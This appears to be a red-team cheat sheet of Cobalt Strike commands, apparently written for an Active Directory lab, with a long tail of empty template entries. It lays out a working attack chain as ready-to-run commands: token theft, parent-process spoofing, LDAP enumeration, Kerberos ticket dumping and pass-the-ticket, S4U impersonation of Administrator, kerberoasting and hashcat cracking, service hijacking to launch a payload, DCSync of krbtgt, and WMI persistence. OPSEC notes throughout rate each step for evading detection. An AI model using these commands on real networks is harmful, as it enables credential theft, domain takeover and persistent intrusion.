# Red Team Ops & Cobalt Strike Command Library  

>Library describing of frequent commands  

>Beacon sleep 3 seconds jitter 20  

```cs
sleep 3 20
```  

>Open Process browser tab current beacon    

```cs
process_browser
```  

>Impersonated by stealing users Windows access token from that process

```
steal_token 1234
```  

>spoof parent OPSEC-🟢SAFE

```cs
ppid <explorer.exe PID>
```  

>spawnto set to werfault.exe after first beacon 

```cs
spawnto x64 %windir%\sysnative\werfault.exe
```  

>Get User ID    

```cs
getuid
```  

>Working Directory  

```cs
pwd
```  

>List processes in beacon console    

```cs
ps
```  

>Command Description oneliner  

```cs
krb_triage
```  

> Enumerate Domain, OUs, GPOs — with ACL data for BloodHound edges  

```
ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor
```

>Enumerate Users, computers, groups — with ACL data

```
ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor
```
>Enumerate users + computers + groups in one OPSEC-🟢SAFE  

```cs
ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor,samaccountname,memberof,admincount,servicePrincipalName,dNSHostName,operatingSystem
```

>Enumerate computers OPSEC-🟢SAFE  

```cs
ldapsearch (samAccountType=805306369) --attributes name,dnsHostName,operatingSystem
```  

>Enumerate domain inbound or outbound trust  

```
ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
```  

>Enumerate Domain structure OU and GPO  

```
ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor
```

>Copy Beacon Logs to Attacker Desktop, On attacker desktop open Ubuntu tab in Windows Terminal  

```sh
cd /mnt/c/Users/Attacker/Desktop
scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .
```

>Parse Logs with BOFHound tool on Ubuntu WSL, Output JSON copy to BloodHound  

```
bofhound -i logs
```

>Dump krbtgt for a user, need to be SYSTEM beacon    

```cs
krb_triage
krb_dump /user:rsteel /service:krbtgt
```  

>Output from krb_dump, Save kirbi to disk run in PowerShell on attacker desktop OPSEC-🟢SAFE  

```
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("[B64]"))
```

>Create sacrificial user logon session and inject user ticket  

```cs
beacon> make_token CONTOSO\rsteel FakePass
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
beacon> run klist
```  

>unmanaged PS list kerberos tickets OPSEC-🟠CAUTION

```
powerpick klist
```  

>S4U abuse — get service ticket impersonating Administrator

```
krb_s4u /ticket:[TGT] /service:cifs/lon-fs-1 /impersonateuser:Administrator
```

>Output from krb_s4u Save kirbi on attacker desktop PowerShell  

```
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi", [Convert]::FromBase64String("[B64]"))
```  

>if SYSTEM privilege escalation needed OPSEC-🟠CAUTION  

```cs
getsystem
```  

>Rubeus use the Kerberos unconstrained delegation to obtain a TGT for current beacon user without needing credentials. run in any beacon    

```cs
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe tgtdeleg /nowrap
```  

>Rubeus Obtain HASH value for only mssql_svc account and not triggering honeypot accounts, remain OPSEC-🟢SAFE 

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
```  

>Hashcat offline crack

```
hashcat -a 0 -m 13100 /hashcat-cracking/cred-acc-challenge.hash /wordlists/rockyou.txt
```

>From low user beacon, no SYSTEM needed OPSEC-🟢SAFE  

```cs
krb_tgtdeleg
```  

>affects current beacon session fork & run, Sacrificial process for all subsequent commands to msedge.exe. No process is spawned, purely a runtime config OPSEC-🟢SAFE  

```cs
spawnto x64 C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
```  

>Set spawnto for the service payload, affects Artifact Kit service binary payloads. A service EXE payload that will create beacon OPSEC-🟢SAFE   

```cs
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```  

>Enumerate services where low-priv users have FullControl OPSEC-🟢SAFE

```cs
powerpick $lp = @('Everyone','BUILTIN\Users','NT AUTHORITY\Authenticated Users'); ls 'HKLM:\SYSTEM\CurrentControlSet\Services' | % { $acl = Get-Acl $_.PSPath; foreach ($ace in $acl.Access) { if ($ace.AccessControlType -eq 'Allow' -and $ace.IsInherited -eq $false -and $lp -contains $ace.IdentityReference.Value -and $ace.RegistryRights -eq  [System.Security.AccessControl.RegistryRights]::FullControl) { [PSCustomObject]@{ServiceName=$_.PSChildName; Identity=$ace.IdentityReference.Value}}}}
```  

>Record current service configuration  

```cs
sc_stop BadWindowsService
```  

>Upload payload OPSEC-🟠CAUTION   

```cs
upload C:\Payloads\http_x64.svc.exe
```  

>Reconfigure service to point at payload OPSEC-🟠CAUTION

```cs
sc_config BadWindowsService C:\Temp\http_x64.svc.exe 0 2
```  

>Start the service OPSEC-🟠CAUTION 

```cs
sc_start BadWindowsService
```  

>Remove delete payload file    

```cs
rm C:\Temp\http_x64.svc.exe
```  

>requires DA or replication privileges — you cannot get there from a user beacon OPSEC-🟠CAUTION 

```cs
dcsync contoso.com CONTOSO\krbtgt
```  

>Load PowerView script into Beacon Memory, never writes to target OPSEC-🟢SAFE

```cs
powershell-import C:\Tools\PowerView.ps1
```  

>Install WMI subscription triggers on Event 1502, client GPO refresh persistence OPSEC-🟠CAUTION

```cs
beacon> powershell-import C:\Tools\WmiPersistence.ps1
beacon> psinject [BEACON PID] x64 Add-WmiPersistence
```  

>Enumerate WMI subscriptions powerpick, no child process OPSEC-🟢SAFE 

```cs
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __EventFilter
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding
```  

>Trigger GPO refresh to test persistence fires spawns gpupdate.exe child process OPSEC-🟠CAUTION 

```cs
execute gpupdate /target:computer /force
```  

>In the new PowerShell window, the runas one: Request LDAP Service Ticket and Inject (PTT) OPSEC-🟠CAUTION 

```powershell
runas /netonly /user:CONTOSO\pchilds powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/lon-dc-1 /ticket:[ENCODED TGT] /dc:lon-dc-1 /ptt
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
```  

>Request an inter-realm referral ticket OPSEC-🟠CAUTION 

```cs
krb_asktgs /service:krbtgt/partner.com /ticket:<base64-TGT>
```  

>AD Enumeration, Run in the runas PowerShell window where LDAP ticket cached, RSAT installed on host  

```powershell
Get-ADComputer -Filter * -Server lon-dc-1

Get-ADUser -Filter * -Server lon-dc-1
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server lon-dc-1

Get-ADOrganizationalUnit -Filter * -Server lon-dc-1

Get-ADGroup -Filter * -Server lon-dc-1
Get-ADGroupMember "Domain Admins" -Server lon-dc-1 -Recursive

Get-ADTrust -Filter * -Server lon-dc-1

# GPOs
Get-GPO -All -Server lon-dc-1   # requires GroupPolicy module, pre-loaded in lab
```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  

>Command Description oneliner  

```cs

```  


----  

